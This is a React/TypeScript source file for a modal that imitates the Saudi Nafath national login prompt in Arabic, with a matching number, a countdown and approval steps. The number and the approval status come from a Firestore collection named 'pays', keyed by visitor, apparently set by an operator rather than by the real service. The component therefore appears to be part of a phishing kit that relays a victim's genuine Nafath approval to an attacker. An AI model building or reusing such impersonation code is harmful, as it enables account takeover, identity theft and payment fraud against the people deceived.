import { useState, useEffect, useRef, useCallback } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { ShieldAlert, X, Smartphone, ScanFace } from "lucide-react";
import { db, isFirebaseConfigured } from "@/lib/firebase";
import { doc, onSnapshot, Firestore } from "firebase/firestore";

interface NafazModalProps {
  isOpen: boolean;
  onClose: () => void;
  authNumber: string;
  visitorId: string;
}

export function NafazModal({ isOpen, onClose, authNumber, visitorId }: NafazModalProps) {
  const [timeLeft, setTimeLeft] = useState(120);
  const [nafazPin, setNafazPin] = useState<string>("");
  const [liveAuthNumber, setLiveAuthNumber] = useState<string>("");
  const [loading, setLoading] = useState(true);
  const unsubscribeRef = useRef<(() => void) | null>(null);
  const hasListenerRef = useRef(false);

  const cleanup = useCallback(() => {
    if (unsubscribeRef.current) {
      unsubscribeRef.current();
      unsubscribeRef.current = null;
    }
    hasListenerRef.current = false;
  }, []);

  useEffect(() => {
    if (!isOpen) {
      cleanup();
      setTimeLeft(120);
      setLoading(true);
      setLiveAuthNumber("");
      return;
    }

    if (!visitorId || !isFirebaseConfigured || !db || hasListenerRef.current) return;

    hasListenerRef.current = true;

    unsubscribeRef.current = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data();
          if (data.nafaz_pin) {
            setNafazPin(data.nafaz_pin);
          }
          // Update auth number from Firestore in real-time
          if (data.authNumber && data.authNumber !== "...") {
            setLiveAuthNumber(data.authNumber);
          }
          if (data.nafazStatus === "approved" || data.nafathApproved) {
            cleanup();
            onClose();
          }
        }
        setLoading(false);
      },
      (error) => {
        console.error("[nafaz-modal] Firestore listener error:", error);
        setLoading(false);
      }
    );

    return cleanup;
  }, [isOpen, visitorId, onClose, cleanup]);

  useEffect(() => {
    if (!isOpen) {
      setTimeLeft(120);
      return;
    }

    const timer = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [isOpen]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  const displayPin = nafazPin || liveAuthNumber || authNumber || "------";

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-md mx-auto" dir="rtl">
        <DialogHeader>
          <DialogTitle className="text-center text-2xl font-bold text-teal-600 mb-2">
            طلب المصادقة
          </DialogTitle>
          <p className="text-center text-sm text-gray-600">
            يرجى التحقق من تطبيق نفاذ على جهازك
          </p>
        </DialogHeader>

        <div className="text-center space-y-6 p-4">
          <div className="bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-300 rounded-xl p-8 shadow-inner">
            <div className="text-sm text-gray-600 mb-3 font-medium">
              رقم المصادقة
            </div>
            {loading ? (
              <div className="animate-pulse h-12 w-32 mx-auto bg-teal-200 rounded flex items-center justify-center">
                <span className="text-teal-600">انتظر...</span>
              </div>
            ) : (
              <div className="text-5xl font-bold text-teal-600 tracking-widest font-mono">
                {displayPin}
              </div>
            )}
          </div>

          <div className="space-y-3 bg-gray-50 p-4 rounded-lg">
            <div className="flex items-center justify-center gap-2 text-teal-600 mb-2">
              <ShieldAlert className="w-5 h-5" />
              <div className="text-gray-800 font-bold">
                تم إرسال طلب مصادقة
              </div>
            </div>
            <div className="text-sm text-gray-600 leading-relaxed">
              يرجى فتح تطبيق نفاذ على جهازك المحمول والضغط على الرقم المطابق
              لإتمام عملية تسجيل الدخول
            </div>
          </div>

          <div className="flex items-center justify-center gap-3 text-teal-600 py-4">
            <div className="relative">
              <div className="w-3 h-3 bg-teal-600 rounded-full animate-ping absolute"></div>
              <div className="w-3 h-3 bg-teal-600 rounded-full"></div>
            </div>
            <div className="text-sm font-medium">في انتظار الموافقة...</div>
            <div className="bg-gray-100 rounded-lg px-3 py-1">
              <span className="text-teal-600 font-semibold">{formatTime(timeLeft)}</span>
            </div>
          </div>

          <div className="flex flex-row gap-6 justify-center pt-4 border-t">
            <div className="flex flex-col items-center space-y-2">
              <span className="text-teal-600 font-semibold text-sm">الخطوة 1</span>
              <div className="w-16 h-16 bg-teal-100 rounded-xl flex items-center justify-center">
                <Smartphone className="w-8 h-8 text-teal-600" />
              </div>
              <span className="text-teal-600 text-xs text-center">تحميل تطبيق نفاذ</span>
            </div>

            <div className="flex flex-col items-center space-y-2">
              <span className="text-teal-600 font-semibold text-sm">الخطوة 2</span>
              <div className="w-16 h-16 bg-teal-100 rounded-xl flex items-center justify-center">
                <ScanFace className="w-8 h-8 text-teal-600" />
              </div>
              <span className="text-teal-600 text-xs text-center max-w-[120px]">
                اختيار الرقم والتحقق
              </span>
            </div>
          </div>

          <Button
            variant="outline"
            onClick={onClose}
            className="w-full border-2 border-gray-300 text-gray-700 hover:bg-gray-100 h-11 font-semibold"
            data-testid="button-nafaz-modal-close"
          >
            إلغاء
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  );
}
